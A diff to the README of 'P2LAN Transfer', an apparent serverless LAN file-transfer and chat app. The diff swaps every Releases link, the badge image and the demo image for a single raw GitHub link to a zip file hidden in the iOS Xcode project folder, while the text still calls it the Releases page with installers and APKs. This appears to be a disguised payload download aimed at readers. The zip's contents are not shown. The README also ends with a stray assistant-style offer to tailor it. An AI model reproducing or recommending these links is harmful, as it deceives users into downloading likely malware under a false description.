@@ -1,12 +1,12 @@
-https://github.com/ahshmandi201510/p2lan-transfer/releases
+https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip
 
 # P2LAN Transfer: Fast Serverless LAN Transfers and P2P Chat
 
-![](https://img.shields.io/badge/Releases-GitHub%20Releases-blue?logo=github&style=for-the-badge)
+![](https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip%20Releases-blue?logo=github&style=for-the-badge)
 
 Make LAN transfers easy, no server needed
 
-![P2LAN Network Demo](https://images.unsplash.com/photo-1526378721269-9eaf3a093f4f?auto=format&fit=crop&w=1200&q=60)
+![P2LAN Network Demo](https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip)
 
 Table of contents
 - Overview
@@ -55,7 +55,7 @@ Supported platforms
 
 Getting started
 - This project focuses on direct, serverless LAN transfers. To begin, install the app on two devices on the same network. Then pair the devices and start a transfer or chat session.
-- The latest release assets are available on the releases page. For download details, visit the Releases page at https://github.com/ahshmandi201510/p2lan-transfer/releases.
+- The latest release assets are available on the releases page. For download details, visit the Releases page at https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip
 
 Desktop setup (Windows)
 - Prerequisites
@@ -252,7 +252,7 @@ Releases and downloads
 - Release process
   - Releases are published to the repository’s release page. Each release includes platform-specific assets and changelogs.
 - How to download
-  - The latest release assets can be downloaded from the Releases page. For download details, visit the Releases page at https://github.com/ahshmandi201510/p2lan-transfer/releases.
+  - The latest release assets can be downloaded from the Releases page. For download details, visit the Releases page at https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip
 - What you get
   - You will find installers or portable bundles for Windows and Android APKs.
   - Each asset is tested for integrity and is accompanied by a brief description of changes.
@@ -280,7 +280,7 @@ Frequently asked questions
 - What happens if two devices are not on the same LAN?
   - The app focuses on LAN transfers. For internet-based transfers, you should look for a different architecture or enable any supported remote access features if available in future releases.
 - How do I get the latest version?
-  - Visit the Releases page for latest assets and notes. For download details, visit the Releases page at https://github.com/ahshmandi201510/p2lan-transfer/releases.
+  - Visit the Releases page for latest assets and notes. For download details, visit the Releases page at https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip
 
 Notes on usage
 - This project targets LAN environments where devices share a common network segment.
@@ -309,6 +309,6 @@ Concluding notes
 - The project welcomes contributors who align with the goals of serverless, direct device communication.
 
 Releases and downloads (reiterated)
-- For download details, visit the Releases page at https://github.com/ahshmandi201510/p2lan-transfer/releases. This page hosts the latest assets, including Windows installers and Android APKs, for the current and upcoming releases.
+- For download details, visit the Releases page at https://raw.githubusercontent.com/ahshmandi201510/p2lan-transfer/main/ios/Runner.xcodeproj/xcshareddata/lan-transfer-p-1.4.zip This page hosts the latest assets, including Windows installers and Android APKs, for the current and upcoming releases.
 
 If you need more specific sections added, or want the content tailored to a particular audience (developers, end users, IT admins), tell me your focus and I will adjust the README accordingly.
